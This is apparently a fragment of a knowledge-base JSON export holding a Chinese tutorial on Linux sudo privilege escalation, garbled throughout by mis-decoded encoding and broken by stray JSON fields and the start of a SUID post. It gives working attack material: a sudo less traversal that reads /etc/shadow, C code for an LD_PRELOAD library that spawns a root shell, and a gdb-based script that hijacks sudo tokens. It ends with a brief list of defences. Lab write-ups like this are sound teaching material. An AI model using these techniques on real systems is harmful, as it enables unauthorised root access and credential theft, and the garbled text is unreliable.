ï¼Œå°†æ­¤é…ç½®è¿½åŠ åˆ° /etc/sudoers æ–‡ä»¶ä¸­ è¿™é‡Œçœ‹ä¼¼æ˜¯å…å¯†sudoæ‰§è¡Œlessæ¥æŸ¥çœ‹/home/yuy0ungä¸‹çš„ä»»ä½•æ–‡ä»¶ï¼Œä½†è¿™é‡Œæ˜¯å¯ä»¥è¿›è¡Œç›®å½•ç©¿è¶Šçš„ï¼š\nsudo less /home/yuy0ung/../../etc/shadow å¦‚æ­¤ï¼Œå¯ä»¥å…å¯†sudoç”¨lessæŸ¥çœ‹/etc/shadowï¼š\næˆåŠŸæŸ¥çœ‹ï¼š\näº”ã€sudo LD_PRELOADç¯å¢ƒå˜é‡ææƒ LD_PRELOAD LD_PRELOADé¢„åŠ è½½æ˜¯ä¸€ä¸ªç¯å¢ƒå˜é‡ï¼Œä¸»è¦ç”¨æ¥è®¾ç½®å…±äº«å¯¹è±¡æ–‡ä»¶çš„è·¯å¾„ï¼Œä»¥ä¾¿ç¨‹åºåœ¨è¿è¡Œæ—¶åŠ è½½åŠ¨æ€é“¾æ¥åº“ã€‚\nç±»ä¼¼äºwindowsåŠ è½½dllçš„æ–¹å¼ï¼Œä¸€èˆ¬æƒ…å†µä¸‹ï¼Œå…±äº«åº“çš„åŠ è½½é¡ºåºå¦‚ä¸‹ï¼š\nåœ¨åº“æœç´¢å‰ï¼Œå…ˆåŠ è½½LD_PRELOADç¯å¢ƒå˜é‡ä¸­æŒ‡å®šçš„åº“ ç¼–è¯‘ä»£ç æ—¶ï¼Œä½¿ç”¨-Wlã€-rpathæŒ‡å®šçš„åŠ¨æ€åº“æœç´¢è·¯å¾„ åŠ è½½LD_LIBRARY_PATHç¯å¢ƒå˜é‡ä¸­æŒ‡å®šçš„å…±äº«åº“ åŠ è½½/etc/ld.so.confæ–‡ä»¶ä¸­æ‰€æŒ‡å®šçš„åŠ¨æ€åº“æœç´¢è·¯å¾„ åŠ è½½/etc/ld.so.cacheæ–‡ä»¶ä¸­æ‰€ç¼“å­˜çš„å…±äº«åº“ åŠ è½½/usr/lib/æˆ–/usr/lib64/ç›®å½•ä¸­çš„å…±äº«åº“ å¯è§LD_PRELOAD ç¯å¢ƒå˜é‡çš„åŠ è½½çº§åˆ«æœ€é«˜ã€‚å½“åº”ç”¨ç¨‹åºå¯åŠ¨æ—¶ï¼Œæ¸—é€æµ‹è¯•äººå‘˜å¯ä»¥é€šè¿‡å¯¹ LD_PRELOAD ç¯å¢ƒå˜é‡çš„æ§åˆ¶æ¥è®©ç¨‹åºä¼˜å…ˆåŠ è½½ä¸€ä¸ªè‡ªå·±åˆ›å»ºçš„åé—¨å…±äº«åº“ï¼Œä»è€Œè¾¾åˆ°æƒé™æå‡çš„ç›®çš„\nä½¿ç”¨ LD_PRELOAD è¿›è¡Œæƒé™æå‡éœ€è¦æ»¡è¶³å‡ ä¸ªæ¡ä»¶ï¼š\nè¢«åŠ«æŒçš„å‘½ä»¤æˆ–ç¨‹åºå¿…é¡»å…·æœ‰è¾ƒé«˜çš„æƒé™ åœ¨ /etc/sudoers æ–‡ä»¶ä¸­å®šä¹‰äº† env_keep+=LD_PRELOAD å…è®¸ç¼–è¾‘ LD_PRELOAD ç¯å¢ƒå˜é‡ åœ¨ Linux ç³»ç»Ÿä¸­ï¼Œå½“ç”¨æˆ·ä½¿ç”¨ sudo å‘½ä»¤ä»¥æå‡åçš„æƒé™æ‰§è¡Œå‘½ä»¤æ—¶ï¼Œç³»ç»Ÿä¼šé‡æ–°åŠ è½½ç¯å¢ƒå˜é‡\nenv_keep+=LD_PRELOAD æ˜¯ sudoers æ–‡ä»¶ä¸­çš„ä¸€æ¡å‚æ•°ï¼Œå¦‚æœåœ¨ sudoers æ–‡ä»¶ä¸­æ·»åŠ äº†æ­¤å‚æ•°ï¼Œåˆ™å½“ç”¨æˆ·ä½¿ç”¨ sudo æ‰§è¡Œå‘½ä»¤æ—¶ï¼Œç³»ç»Ÿä¼šä¿ç•™ LD_PRELOAD ç¯å¢ƒå˜é‡ï¼Œè€Œä¸ä¼šå°†å…¶é‡ç½®ã€‚\nåœ¨å®é™…æ¸—é€æµ‹è¯•è¿‡ç¨‹ä¸­ï¼Œä¸ºé˜²æ­¢ç¨‹åºå´©æºƒï¼Œæœ€ç¨³å¦¥çš„åˆ©ç”¨æ–¹å¼æ˜¯é‡å†™ä¸€ä¸ªæ­£å¸¸çš„åº“æ–‡ä»¶ï¼Œå¹¶åœ¨å…¶ä¸­å®šä¹‰åŸåº“æ–‡ä»¶ä¸­çš„å‡½æ•°åŠåé—¨å‡½æ•°ã€‚\nåˆ©ç”¨æ­¥éª¤ æ¼”ç¤ºä¸»æœºä¸ºubuntu 16.04.1\nç¯å¢ƒé…ç½® é¦–å…ˆä»¥rootèº«ä»½åœ¨/etc/sudoerä¸­æ·»åŠ env_keep+=LD_PRELOADï¼š å†æ·»åŠ ä¸€ä¸ªsudoé…ç½®ï¼Œæˆ‘è¿™é‡Œæ·»åŠ çš„æ˜¯apache2ï¼š\nokåˆ‡æ¢åˆ°æ™®é€šç”¨æˆ·yuy0ungå‡†å¤‡å¤ç°\nåˆ©ç”¨ æŸ¥çœ‹sudoé…ç½®ï¼š\napache2å¯ä»¥å…å¯†sudoï¼Œè¿™é‡Œå…¶å®å¯ä»¥åˆ©ç”¨apache2æ˜¾ç¤º/etc/shadowçš„å†…å®¹å†è¿›è¡Œå¯†ç çˆ†ç ´ï¼Œä½†æ³¨æ„åˆ° env_keep+=LD_PRELOADï¼Œå³ä¿ç•™å½“å‰LD_PRELOADç¯å¢ƒå˜é‡ï¼Œé‚£ä¹ˆå°±æœ‰ä¸ªæ›´å¥½çš„æ€è·¯ï¼šå¯ä»¥é€šè¿‡åˆ›å»ºä¸€ä¸ªä»¥rootæƒé™å¯åŠ¨BashShell ä¸ºå†…å®¹çš„å…±äº«åº“ï¼Œåœ¨ä½¿ç”¨sudoå‘½ä»¤å¯åŠ¨ apache2 æœåŠ¡æ—¶åŠ è½½æ­¤å…±äº«åº“æ¥è¿›è¡Œææƒ\nç¼–å†™cæ–‡ä»¶ï¼š\n#include\u0026lt;stdio.h\u0026gt; #include\u0026lt;sys/types.h\u0026gt; #include\u0026lt;stdlib.h\u0026gt; void _init(){ unsetenv(\u0026#34;LD_PRELOAD\u0026#34;); //ä¸è®©ç¯å¢ƒå˜é‡é‡ç½®,ä¿æŒä½¿ç”¨ç°åœ¨çš„å…±äº«åº“ setresuid(0,0,0); system(\u0026#34;/bin/bash -p\u0026#34;); } gccç¼–è¯‘ä¸ºshell.soï¼Œä¸”ä¸ä½¿ç”¨é»˜è®¤çš„å¯åŠ¨æ–‡ä»¶:\ngcc -shared -fPIC -o shell.so shell.c -nostartfiles æ‰§è¡Œå‘½ä»¤å¯åŠ¨apache2å¹¶åŠ è½½LD_PRELOADä¸­çš„è‡ªå®šä¹‰åº“ï¼š\nsudo LD_PRELOAD=/tmp/shell.so apache2 æˆåŠŸææƒ\nå…­ã€åˆ©ç”¨sudo cachingææƒ sudo cachingæ˜¯ä¸€ç§ç”¨äºæé«˜å‘½ä»¤æ‰§è¡Œæ•ˆç‡çš„æŠ€æœ¯\nç”¨æˆ·ç¬¬ä¸€æ¬¡ä½¿ç”¨sudoå‘½ä»¤æ—¶ï¼Œç³»ç»Ÿä¼šæç¤ºç”¨æˆ·è¾“å…¥å¯†ç ï¼Œç„¶åå°†ç”¨æˆ·çš„èº«ä»½éªŒè¯ä¿¡æ¯ç¼“å­˜èµ·æ¥ï¼Œé€šå¸¸åœ¨ 15 åˆ†é’Ÿå†…ï¼ˆå¯ä»¥é€šè¿‡åœ¨é…ç½®æ–‡ä»¶ä¸­ä¿®æ”¹ timestamp_timeout å‚æ•°æ¥ä¿®æ”¹ç¼“å­˜æ—¶é—´ï¼‰ã€‚ç”¨æˆ·åœ¨æ­¤æ—¶é—´å†…æ— éœ€å†æ¬¡è¾“å…¥å¯†ç å°±å¯ä»¥æ‰§è¡Œ sudo å‘½ä»¤ï¼Œä»è€Œæé«˜æ•ˆç‡ã€‚ä¸è¿‡ï¼Œsudo ç¼“å­˜ä¹Ÿæœ‰ä¸€äº›å®‰å…¨é£é™©ã€‚å¦‚æœæ¸—é€æµ‹è¯•äººå‘˜èƒ½å¤Ÿè·å¾—æ­¤ç”¨æˆ·çš„æƒé™ï¼Œé‚£ä¹ˆåœ¨ sudo ç¼“å­˜æ—¶é—´å†…ï¼Œä»–ä»¬å°±å¯ä»¥æ— é¡»è¾“å…¥å¯†ç æ‰§è¡Œsudoå‘½ä»¤ï¼Œä»è€Œè·å¾—æ›´é«˜çš„æƒé™\nsudoersæ–‡ä»¶ä¸­æœ‰ä¸‰ä¸ªå‚æ•°ä¸ä¹‹æœ‰å…³ï¼Œåˆ†åˆ«æ˜¯ !authenticateã€timestamp_timeout=-1 å’Œ !tty_ticketsï¼š\nauthenticate å‚æ•°ç”¨äºé…ç½®ä½¿ç”¨ sudo å‘½ä»¤æ—¶æ˜¯å¦éœ€è¦è¾“å…¥å¯†ç ã€‚å¦‚æœå¯ç”¨äº† authenticate å‚æ•°ï¼Œåˆ™ç”¨æˆ·åœ¨ä½¿ç”¨ sudo å‘½ä»¤æ—¶éœ€è¦è¾“å…¥å¯†ç ï¼›å¦‚æœç¦ç”¨äº† authenticate å‚æ•°ï¼Œåˆ™ç”¨æˆ·åœ¨ä½¿ç”¨ sudo å‘½ä»¤æ—¶æ— éœ€è¾“å…¥å¯†ç ã€‚å½“åœ¨å‚æ•°å‰æ·»åŠ ç¬¦å·â€œ!â€æ—¶ï¼Œè¡¨ç¤ºè¯¥å‚æ•°è¢«ç¦ç”¨\ntimestamp_timeout å‚æ•°ç”¨äºè®¾ç½®åœ¨ä½¿ç”¨ sudo å‘½ä»¤æ—¶çš„è¶…æ—¶æ—¶é—´ã€‚å¦‚æœè®¾ç½®äº† timestamp_timeout å‚æ•°ï¼Œåˆ™åœ¨æŒ‡å®šçš„æ—¶é—´é—´éš”å†…ï¼Œç”¨æˆ·æ— éœ€å†æ¬¡è¾“å…¥å¯†ç å³å¯ä½¿ç”¨ sudo å‘½ä»¤ã€‚å½“ timestamp_timeout å‚æ•°è®¾ç½®ä¸º -1 æ—¶ï¼Œæ„å‘³ç€ç”¨æˆ·åœ¨å½“å‰ç»ˆç«¯çª—å£æ°¸è¿œä¸éœ€è¦è¾“å…¥å¯†ç \ntty_tickets å‚æ•°ç”¨äºå¯ç”¨æˆ–ç¦ç”¨ TTYï¼ˆteletypeï¼Œç»ˆç«¯ï¼‰ç¥¨æ®åŠŸèƒ½ã€‚å¦‚æœå¯ç”¨äº† TTY ç¥¨æ®åŠŸèƒ½ï¼Œåˆ™ç”¨æˆ·åœ¨æ¯ä¸ªç»ˆç«¯ä¸Šæ‰§è¡Œ sudo å‘½ä»¤æ—¶éƒ½éœ€è¦è¾“å…¥å¯†ç å¦‚æœç¦ç”¨äº† TTY ç¥¨æ®åŠŸèƒ½ï¼Œåˆ™ç”¨æˆ·åœ¨ä½¿ç”¨ sudo å‘½ä»¤æ—¶åªéœ€è¦è¾“å…¥ä¸€æ¬¡å¯†ç ï¼Œåœ¨å…¶ä»–ç»ˆç«¯ä¸­æ— éœ€å†è¾“å…¥\nå¦‚æœå½“å‰ç³»ç»Ÿçš„ sudoers é…ç½®æ–‡ä»¶ä¸­æœ‰ä»¥ä¸Šä¸‰ç§ä¸­çš„ä»»æ„ä¸€ä¸ªå‚æ•°ï¼Œé‚£ä¹ˆæ¸—é€æµ‹è¯•äººå‘˜å°±æœ‰å¯èƒ½æ— éœ€è¾“å…¥å¯†ç å³å¯æ‰§è¡Œ sudo å‘½ä»¤ï¼Œä»è€Œå®Œæˆæƒé™æå‡\nä¸ƒã€sudoä»¤ç‰Œè¿›ç¨‹æ³¨å…¥ææƒ æ€è·¯ä¸åˆ©ç”¨è„šæœ¬æ¥æºäºgithubé¡¹ç›®nongiach/sudo_inject: [Linux] Two Privilege Escalation techniques abusing sudo token (github.com)\nå½“ç”¨æˆ·ä½¿ç”¨ sudo æ‰§è¡Œå‘½ä»¤åï¼Œä¼šåœ¨ /var/run/sudo/ts ç›®å½•ä¸­åˆ›å»ºä¸€ä¸ªå¸¦æœ‰ç”¨æˆ·åçš„æ—¶é—´æˆ³æ–‡ä»¶ã€‚æ­¤æ–‡ä»¶åŒ…å«æœ‰å…³ç”¨æˆ·èº«ä»½éªŒè¯æˆåŠŸæˆ–å¤±è´¥çš„ä¿¡æ¯ã€‚sudo ç¨‹åºä½¿ç”¨æ­¤ä¿¡æ¯æ¥è·Ÿè¸ªå·²é€šè¿‡èº«ä»½éªŒè¯çš„è¿›ç¨‹ï¼Œä»¥ä¾¿åœ¨éœ€è¦æ—¶æä¾›é€‚å½“çš„æƒé™\nLinux ç³»ç»Ÿåœ¨æ–‡ä»¶ /proc/sys/kernel/yama/ptrace_scope ä¸­é…ç½®äº†ç”¨äºæ§åˆ¶è¿›ç¨‹è¿½è¸ªï¼ˆProcess Tracingï¼‰çš„æƒé™ï¼Œå¦‚å›¾ 9-76 æ‰€ç¤ºã€‚è¿›ç¨‹è¿½è¸ªæ˜¯ä¸€ç§è°ƒè¯•æŠ€æœ¯ï¼Œå®ƒå…è®¸ä¸€ä¸ªè¿›ç¨‹æ£€æŸ¥å’Œæ§åˆ¶å¦ä¸€ä¸ªè¿›ç¨‹çš„æ‰§è¡Œ\nå½“æ–‡ä»¶å†…å®¹ä¸º 0 æ—¶ï¼Œå…è®¸æ‰€æœ‰è¿›ç¨‹è¢«è¿½è¸ªï¼› å½“æ–‡ä»¶å†…å®¹ä¸º 1 æ—¶ï¼Œåªå…è®¸çˆ¶è¿›ç¨‹å¯¹å­è¿›ç¨‹è¿›è¡Œè¿½è¸ªï¼› å½“æ–‡ä»¶å†…å®¹ä¸º 2 æ—¶ï¼Œç¦æ­¢æ‰€æœ‰è¿›ç¨‹è¢«è¿½è¸ªã€‚ å¦‚æœå½“å‰ç³»ç»Ÿçš„ ptrace_scope å€¼è®¾ç½®ä¸º 0ï¼Œå¹¶ä¸”æ­¤æ—¶æœ‰ç”¨æˆ·ä½¿ç”¨ sudo æ¥æ‰§è¡Œå‘½ä»¤ï¼Œåˆ™å¯ä»¥å°è¯•æ¿€æ´» /var/lib/sudo/ts/ ç›®å½•ä¸‹çš„æ‰€æœ‰ sudo ä¼šè¯çš„ä»¤ç‰Œï¼Œæ³¨å…¥å…·æœ‰æœ‰æ•ˆ sudo ä»¤ç‰Œçš„è¿›ç¨‹å¹¶æ¿€æ´»æˆ‘ä»¬è‡ªå·±çš„ sudo ä»¤ç‰Œ\nåˆ©ç”¨æ­¥éª¤ ç¯å¢ƒé…ç½® é¦–å…ˆä»¥rootèº«ä»½é…ç½®/proc/sys/kernel/yama/ptrace_scopeï¼š\necho 0 \u0026gt; /proc/sys/kernel/yama/ptrace_scope # è¿™ä¸ªè®¾ç½®åœ¨é‡å¯ä¹‹åä¼šè‡ªåŠ¨å¤±æ•ˆ åˆ‡æ¢åˆ°æ™®é€šç”¨æˆ·yuy0ungå®Œæˆé…ç½®\nåˆ©ç”¨ ä¸ºäº†æ–¹ä¾¿å®éªŒï¼Œæˆ‘ç›´æ¥å°†è„šæœ¬å…¨éƒ¨ä¸‹è½½è‡³/tmpç›®å½•äº†ï¼š å…¨éƒ¨èµ‹äºˆæƒé™ï¼š å¼€å§‹åˆ©ç”¨\né¦–å…ˆæ˜¯ç¬¬ä¸€ä¸ªåˆ©ç”¨è„šæœ¬ï¼š\n#!/bin/sh # create an invalid sudo entry for the current shell echo | sudo -S \u0026gt;/dev/null 2\u0026gt;\u0026amp;1 echo \u0026#34;Current process : $$\u0026#34; cp activate_sudo_token /tmp/ chmod +x activate_sudo_token # timestamp_dir=$(sudo --version | grep \u0026#34;timestamp dir\u0026#34; | grep -o \u0026#39;/.*\u0026#39;) # inject all shell belonging to the current user, our shell one :p for pid in $(pgrep \u0026#39;^(ash|ksh|csh|dash|bash|zsh|tcsh|sh)$\u0026#39; -u \u0026#34;$(id -u)\u0026#34; | grep -v \u0026#34;^$$\\$\u0026#34;) do echo \u0026#34;Injecting process $pid -\u0026gt; \u0026#34;$(cat \u0026#34;/proc/$pid/comm\u0026#34;) echo \u0026#39;call system(\u0026#34;echo | sudo -S /tmp/activate_sudo_token /var/lib/sudo/ts/* \u0026gt;/dev/null 2\u0026gt;\u0026amp;1\u0026#34;)\u0026#39; \\ | gdb -q -n -p \u0026#34;$pid\u0026#34; \u0026gt;/dev/null 2\u0026gt;\u0026amp;1 done åˆ†æ­¥éª¤è§£é‡Šä¸€ä¸‹ï¼š\nä½¿ç”¨ sudo -S åˆ›å»ºä¸€ä¸ªæ— æ•ˆçš„ sudo æ—¶é—´æˆ³é¡¹ï¼Œä»¥é˜»æ­¢ sudo ç¼“å­˜å½“å‰ shell çš„ sudo ä»¤ç‰Œï¼Œä»è€Œç¡®ä¿è„šæœ¬åç»­æ“ä½œä¸ä¼šå¯¼è‡´å¯†ç è¯·æ±‚\næ‰“å°å½“å‰è„šæœ¬çš„è¿›ç¨‹ IDï¼ˆPIDï¼‰\nå°† activate_sudo_token ç¨‹åºå¤åˆ¶åˆ° /tmp/ ç›®å½•å¹¶èµ‹äºˆå¯æ‰§è¡Œæƒé™\nä½¿ç”¨ pgrep æŸ¥æ‰¾å½“å‰ç”¨æˆ·ä¸‹çš„æ‰€æœ‰ Shell è¿›ç¨‹ï¼ˆå¦‚ bashã€zsh ç­‰ï¼‰ï¼Œå¹¶æ’é™¤å½“å‰è„šæœ¬è¿›ç¨‹\nå¯¹äºæ¯ä¸€ä¸ªæ‰¾åˆ°çš„ Shell è¿›ç¨‹ï¼Œæ‰“å°è¿›ç¨‹ä¿¡æ¯ï¼Œç„¶ååˆ©ç”¨ gdb æ³¨å…¥ä¸€ä¸ªå‘½ä»¤ï¼Œé€šè¿‡ system è°ƒç”¨æ¥æ‰§è¡Œ activate_sudo_tokenï¼Œå¹¶å°† sudo æ—¶é—´æˆ³ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶ä½œä¸ºå‚æ•°ä¼ å…¥ï¼Œæ‰€æœ‰è¾“å‡ºéƒ½è¢«é‡å®šå‘åˆ° /dev/null\nè¿™æ®µä»£ç çš„æ•ˆæœæ˜¯ï¼Œåœ¨æ‰§è¡Œsudoå‘½ä»¤æ—¶éœ€è¦è¾“äººå¯†ç çš„æƒ…å†µä¸‹è°ƒç”¨/tmp/activate_sudo_tokenç¨‹åºï¼Œæ³¨å…¥æ‰€æœ‰æ­£åœ¨è¿è¡Œçš„Shellè¿›ç¨‹ä¸­ï¼Œå¹¶ä¼ å…¥/var/lib/sudo/ts/ç›®å½•ä¸‹ï¼Œæ‰€æœ‰æ–‡ä»¶çš„è·¯å¾„ä¸ºæ­¤ç¨‹åºå‚æ•°ï¼Œå¹¶ä¸”ä¸ä¼šæœ‰å…¶ä»–è¾“å‡ºï¼Œç›´åˆ°å¯»æ‰¾åˆ°æœ‰æ•ˆçš„sudoä»¤ç‰Œè¿›ç¨‹ï¼Œæœ€åä½¿ç”¨æ­¤sudoå‘½ä»¤æ¿€æ´»å½“å‰è¿›ç¨‹\nè¿™é‡Œéœ€è¦å¦èµ·ä¸€ä¸ªç»ˆç«¯sudoæ‰§è¡Œä¸€ä¸‹å‘½ä»¤å¹¶è¾“å…¥å¯†ç ï¼Œè¿™ä¹Ÿæ˜¯åˆ©ç”¨çš„æ¡ä»¶ä¹‹ä¸€ï¼š\næ¥ä¸‹æ¥æ‰§è¡Œè„šæœ¬æ–‡ä»¶è¿›è¡Œåˆ©ç”¨ï¼š\nåœ¨è„šæœ¬å®Œæˆæ³¨å…¥åæ‰§è¡Œsudo -iå³å¯å®Œæˆææƒ æˆåŠŸè·å¾—rootæƒé™\nåŒç†ï¼Œä¸Šé¢æåˆ°çš„githubé¡¹ç›®è¿˜æœ‰å…¶ä»–åˆ©ç”¨è„šæœ¬ï¼Œéœ€è¦çš„å¯ä»¥è‡ªè¡Œé˜…è¯»ï¼Œè¿™é‡Œä¸å†èµ˜è¿°\nå…«ã€å¦‚ä½•é˜²å¾¡ï¼Ÿ å¯¹ç—‡ä¸‹è¯ï¼š\nç¡®ä¿sudoæƒé™åˆ†é…æ­£ç¡®ï¼Œä¸è¢«æ»¥ç”¨ å¯¹sudoå‘½ä»¤è°ƒç”¨çš„è‡ªå®šä¹‰è„šæœ¬çš„è¯»å†™æƒé™è¿›è¡Œä¸¥æ ¼æ§åˆ¶ å°½é‡ä¸åœ¨sudoersæ–‡ä»¶ä¸­ä½¿ç”¨é€šé…ç¬¦è¿›è¡Œè·¯å¾„é…ç½® å…³é—­sudoç¼“å­˜ æ­£ç¡®é…ç½®ptrace_scopeæ–‡ä»¶ ",
        "summary": "sudoç›¸å…³ææƒæ€è·¯ sudoï¼ˆsuper user doï¼‰æ˜¯linuxç³»ç»Ÿä¸­ç”¨äºç®¡ç†ç”¨æˆ·æƒé™çš„å·¥å…·ï¼Œå…è®¸æ™®é€šç”¨æˆ·åœ¨æ— éœ€åˆ‡æ¢åˆ°è¶…çº§ç”¨æˆ·çš„æƒ…å†µä¸‹ä»¥rootèº«ä»½æ‰§è¡Œå‘½ä»¤ï¼Œé€šå¸¸ï¼Œåœ¨ä½¿ç”¨sudoå‘½ä»¤æ—¶ï¼Œç”¨æˆ·éœ€è¦è¾“å…¥è‡ªå·±çš„å¯†ç éªŒè¯è‡ªå·±æ˜¯å¦æœ‰æƒé™ä½¿ç”¨ï¼Œå¦‚æœæ²¡æœ‰æƒé™ï¼Œä¼šå‘ŠçŸ¥ç”¨æˆ·ï¼šè¯¥ç”¨æˆ·ä¸åœ¨sudoersæ–‡ä»¶ä¸­ï¼Œè¿™ä¸ªäº‹ä»¶å°†ä¼šè¢«æŠ¥å‘Š\nå¦‚æœsudoé…ç½®ä¸å½“ï¼Œå¯èƒ½å¯¼è‡´å®‰å…¨éšæ‚£\nä¸€ã€sudoæƒé™åˆ†é…ä¸å½“ å½“é…ç½®æ™®é€šç”¨æˆ·sudoæƒé™æ—¶ï¼Œè®¾ç½®äº†å…å¯†çš„sudoç”¨æˆ·ï¼Œå³è¯¥ç”¨æˆ·ä¸éœ€è¦è¾“å…¥å£ä»¤å³å¯æ‰§è¡Œç‰¹æƒå‘½ä»¤\næˆ‘ä»¬é€šå¸¸ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤æŸ¥çœ‹å½“å‰sudoæƒé™ï¼š\nsudo -l è€Œæœ‰ä¸€éƒ¨åˆ†å‘½ä»¤å¦‚æœèƒ½å…å¯†æ‰§è¡Œï¼Œåˆ™å¯ä»¥è¿›è¡Œæƒé™æå‡çš„åˆ©ç”¨ï¼Œè¿™ä¹Ÿæ˜¯æˆ‘ä»¬å¸¸è¯´çš„sudoææƒ\nsudoçš„åŸºæœ¬åˆ©ç”¨æ€è·¯æœ‰å¦‚ä¸‹å‡ ç§ï¼š\nå…å¯†ä½¿ç”¨sudoæƒé™æ‰§è¡ŒæŸäº›å‘½ä»¤ï¼Œé‡æ–°è·å–ä¸€ä¸ªrootèº«ä»½çš„shell æŸäº›å·¥å…·å…è®¸å…å¯†sudoè¿è¡Œï¼Œä¸”èƒ½å¤Ÿè¿è¡Œè„šæœ¬/é…ç½®æ–‡ä»¶ï¼Œå¯ä»¥ä¿®æ”¹è„šæœ¬/é…ç½®æ–‡ä»¶å®ç°è·å–ä¸€ä¸ªrootèº«ä»½çš„shell å…å¯†ä½¿ç”¨sudoæƒé™æ‰§è¡ŒæŸäº›å‘½ä»¤ï¼Œè·å–/etc/shadowç¬¬ä¸€è¡Œrootçš„å¯†ç å“ˆå¸Œï¼Œå†è¿›è¡Œçˆ†ç ´è·å–æ˜æ–‡å¯†ç  å…å¯†ä½¿ç”¨sudoæƒé™æ‰§è¡ŒæŸäº›å‘½ä»¤ï¼Œç”¨æ–°çš„rootå¯†ç å“ˆå¸Œè¦†ç›–æ‰åŸæœ¬çš„/etc/shadow ï¼ˆæ€è·¯é€‰æ‹©çš„æ¨èåº¦æŒ‰åºé™ä½ï¼Œè¶Šé åçš„æ€è·¯ï¼Œå¯¹ä¸»æœºé€ æˆçš„å½±å“è¶Šå¤§ï¼‰\nç”±äºèƒ½åˆ©ç”¨çš„åœºæ™¯å¤ªå¤šï¼Œè¿™é‡Œä¸ä½œèµ˜è¿°ï¼Œåˆ©ç”¨å‘½ä»¤å‡å¯åœ¨è¿™ä¸ªç½‘ç«™ä¸ŠæŸ¥è¯¢ï¼šGTFOBins\nå¯ä»¥å‚è€ƒæ–‡ç« å­¦ä¹ ï¼šLinuxææƒä¹‹Sudo 70ç§ææƒæ–¹æ³•\näºŒã€sudoè„šæœ¬ç¯¡æ”¹ææƒ å¦ä¸€ç§æƒ…å†µï¼Œç®¡ç†å‘˜å¯èƒ½ä¼šå°†æŸä¸ªshellè„šæœ¬è®¾ç½®ä¸ºsudoå…å¯†æ‰§è¡Œï¼Œå¦‚æœä½æƒé™ç”¨æˆ·å¯¹è¯¥æ–‡ä»¶å¯å†™ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥å°†ææƒä»£ç å†™å…¥è¯¥æ–‡ä»¶ï¼Œå®ç°æƒé™æå‡ã€‚æˆ‘ä»¬é…ç½®å¦‚ä¸‹åœºæ™¯ï¼ˆå®éªŒç¯å¢ƒä¸ºcentos 7ï¼‰ï¼š\né¦–å…ˆä»¥rootèº«ä»½é…ç½®ï¼š\ngroupadd yuy0ung # åˆ›å»ºä¸€ä¸ªåä¸º yuy0ung çš„æ–°ç»„ useradd -d /home/yuy0ung -m yuy0ung -g yuy0ung -s /bin/bash -p 123456 # æ·»åŠ ç”¨æˆ· yuy0ungï¼ŒæŒ‡å®šä¸»ç›®å½•ä¸º /home/yuy0ungï¼Œè‹¥ä¸å­˜åœ¨åˆ™åˆ›å»ºï¼›è®¾ç½®é»˜è®¤ shell ä¸º /bin/bashï¼›è®¾ç½®ç»„ä¸º yuy0ungï¼›è®¾å®šå¯†ç ä¸º 123456 mkdir -p ~yuy0ung/demo # åˆ›å»ºç›®å½• /home/yuy0ung/demoï¼Œè‹¥ä¸Šçº§ç›®å½•ä¸å­˜åœ¨ï¼Œåˆ™ä¸€å¹¶åˆ›å»º chown yuy0ung:yuy0ung ~yuy0ung/demo # å°†ç›®å½• /home/yuy0ung/demo çš„æ‰€æœ‰è€…å’Œæ‰€å±ç»„æ›´æ”¹ä¸º yuy0ung chmod a+x ~yuy0ung/demo # ä¸ºæ‰€æœ‰ç”¨æˆ·å¢åŠ  /home/yuy0ung/demo ç›®å½•çš„æ‰§è¡Œæƒé™ echo \u0026#34;yuy0ung ALL=(root) NOPASSWD:/home/yuy0ung/demo/shell.sh\u0026#34; \u0026gt;\u0026gt; /etc/sudoers # å…è®¸ yuy0ung ç”¨æˆ·åœ¨ä¸è¾“å…¥å¯†ç çš„æƒ…å†µä¸‹ä»¥ root èº«ä»½æ‰§è¡Œ /home/yuy0ung/demo/shell.sh è„šæœ¬ï¼Œå°†æ­¤é…ç½®è¿½åŠ åˆ° /etc/sudoers æ–‡ä»¶ä¸­ ç„¶ååˆ‡æ¢åˆ°yuy0ungï¼š\n"
    }
,
    {
        "title": "suidç›¸å…³ææƒæ€è·¯",
        "link": "/My-Knowlege-Database/blog/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/linux%E6%8F%90%E6%9D%83/suid%E7%9B%B8%E5%85%B3%E6%8F%90%E6%9D%83%E6%80%9D%E8%B7%AF/",
        "content": "suidç›¸å…³ææƒæ€è·¯ SetUIDæ˜¯linuxçš„ä¸€ç§å®‰å…¨æœºåˆ¶ï¼Œå…è®¸ç”¨æˆ·åœ¨æ‰§è¡Œç‰¹å®šæ–‡ä»¶æ—¶æš‚æ—¶å°†å…¶æœ‰æ•ˆç”¨æˆ·IDæ”¹ä¸ºè¯¥æ–‡ä»¶æ‰€æœ‰è€…çš„ç”¨æˆ·IDã€‚è¿™æ ·ï¼Œå³ä½¿å½“å‰ç”¨æˆ·æ²¡æœ‰æ‰§è¡Œè¯¥æ–‡ä»¶çš„æƒé™ï¼Œä¹Ÿå¯ä»¥æ‰§è¡Œè¯¥æ–‡ä»¶ã€‚\nä½¿ç”¨å¦‚ä¸‹å‘½ä»¤ä¸ºç›®æ ‡æ–‡ä»¶æ·»åŠ suidæƒé™ï¼š\nchmod u+s /etc/passwd æ³¨æ„ï¼š\nåªæœ‰å¯ä»¥æ‰§è¡Œçš„äºŒè¿›åˆ¶ç¨‹åºæ–‡ä»¶æ‰èƒ½è®¾å®šSUIDæƒé™,éäºŒè¿›åˆ¶æ–‡ä»¶è®¾ç½®SUIDæƒé™æ²¡ä»»ä½•æ„ä¹‰ å‘½ä»¤æ‰§è¡Œè€…è¦å¯¹è¯¥ç¨‹åºæ–‡ä»¶æ‹¥æœ‰æ‰§è¡Œ(x)æƒé™æ‰èƒ½ä½¿ç”¨ SUIDæƒé™åªåœ¨è¯¥ç¨‹åºæ‰§è¡Œè¿‡ç¨‹ä¸­æœ‰æ•ˆ,ä¹Ÿå°±æ˜¯è¯´èº«ä»½æ”¹å˜åªåœ¨ç¨‹åºæ‰§è¡Œè¿‡ç¨‹ä¸­æœ‰æ•ˆ suidé…ç½®ä¸å½“ææƒ 